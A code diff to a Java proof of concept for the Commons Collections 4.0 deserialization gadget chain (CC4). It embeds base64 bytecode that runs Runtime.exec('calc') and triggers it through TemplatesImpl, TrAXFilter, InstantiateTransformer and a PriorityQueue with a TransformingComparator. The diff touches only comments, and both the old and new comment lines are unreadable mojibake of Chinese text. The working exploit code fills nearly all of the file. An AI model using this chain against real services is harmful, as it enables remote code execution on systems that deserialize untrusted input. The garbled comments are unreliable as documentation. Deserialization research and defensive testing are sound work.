@@ -23,9 +23,9 @@ public class CommonsCollections4 {
     public static void main(String[] args) {
 
         /**
-         *≤‚ ‘ª∑æ≥£∫4.0£¨jdk7u21º∞“‘«∞
-         * …œ√Ê CC2 Àµ¡À“ÚŒ™ CommonsCollections4 ≥˝4.0µƒ∆‰À˚∞Ê±æ»•µÙ¡À InvokerTransformer µƒ Serializable ºÃ≥–£¨
-         * µº÷¬Œﬁ∑®–Ú¡–ªØ°£À˘“‘Œ“√« «∑Òø…“‘≤ª π”√ InvokerTransformer ƒÿ£ø”⁄ «±„”–¡À CC4
+         *ÊµãËØïÁéØÂ¢ÉÔºö4.0Ôºåjdk7u21Âèä‰ª•Ââç
+         * ‰∏äÈù¢ CC2 ËØ¥‰∫ÜÂõ†‰∏∫ CommonsCollections4 Èô§4.0ÁöÑÂÖ∂‰ªñÁâàÊú¨ÂéªÊéâ‰∫Ü InvokerTransformer ÁöÑ Serializable ÁªßÊâøÔºå
+         * ÂØºËá¥Êó†Ê≥ïÂ∫èÂàóÂåñ„ÄÇÊâÄ‰ª•Êàë‰ª¨ÊòØÂê¶ÂèØ‰ª•‰∏ç‰ΩøÁî® InvokerTransformer Âë¢Ôºü‰∫éÊòØ‰æøÊúâ‰∫Ü CC4
          *
          * ->PriorityQueue.readObject()
          *       ->PriorityQueue.heapify()
@@ -37,46 +37,46 @@ public class CommonsCollections4 {
          *                                     ->InstantiateTransformer.transform()
          *                              ->TrAXFilter.TrAXFilter()
          *                                  ->TemplatesImpl.newTransformer()
-         *                                         ->°≠°≠°≠°≠
+         *                                         ->‚Ä¶‚Ä¶‚Ä¶‚Ä¶
          */
         try {
-            //◊÷Ω⁄¬Î
+            //Â≠óËäÇÁ†Å
             byte[] code = Base64.decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
 
-            //∑¥…‰…Ë÷√ Field
+            //ÂèçÂ∞ÑËÆæÁΩÆ Field
             TemplatesImpl templates = new TemplatesImpl();
             setFieldValue(templates, "_bytecodes", new byte[][]{code});
             setFieldValue(templates, "_name", "HelloTemplatesImpl");
             setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
 
-            //Transformer ˝◊È
+            //TransformerÊï∞ÁªÑ
             Transformer[] transformers = new Transformer[]{
                     new ConstantTransformer(TrAXFilter.class),
                     new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
             };
 
             ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
-            //∏˙cc-2œ‡±»£¨new InvokerTransformer¿˚”√ªª≥…¡ÀChainµ˜”√
+            //Ë∑ücc-2Áõ∏ÊØîÔºånew InvokerTransformerÂà©Áî®Êç¢Êàê‰∫ÜChainË∞ÉÁî®
             TransformingComparator comparator = new TransformingComparator(chainedTransformer);
 
             PriorityQueue priorityQueue = new PriorityQueue(2);
-            //œ»…Ë÷√Œ™’˝≥£±‰¡ø÷µ£¨∫Û√Êø…“‘Õ®π˝setFieldValue–ﬁ∏ƒ
+            //ÂÖàËÆæÁΩÆ‰∏∫Ê≠£Â∏∏ÂèòÈáèÂÄºÔºåÂêéÈù¢ÂèØ‰ª•ÈÄöËøásetFieldValue‰øÆÊîπ
             priorityQueue.add(1);
             priorityQueue.add(2);
 
-            //∑¥…‰…Ë÷√Field£¨Ω´∂‘œÛ ˝◊È∏˘æ›±»Ωœ∆˜≈≈–Ú£ø
+            //ÂèçÂ∞ÑËÆæÁΩÆFieldÔºåÂ∞ÜÂØπË±°Êï∞ÁªÑÊ†πÊçÆÊØîËæÉÂô®ÊéíÂ∫èÔºü
             Object[] objects = new Object[]{templates, templates};
             setFieldValue(priorityQueue, "queue",objects);
             setFieldValue(priorityQueue, "comparator", comparator);
 
-            //–Ú¡–ªØ
+            //Â∫èÂàóÂåñ
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(baos);
             oos.writeObject(priorityQueue);
             oos.flush();
             oos.close();
 
-            //≤‚ ‘∑¥–Ú¡–ªØ
+            //ÊµãËØïÂèçÂ∫èÂàóÂåñ
             ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
             ObjectInputStream ois = new ObjectInputStream(bais);
             ois.readObject();
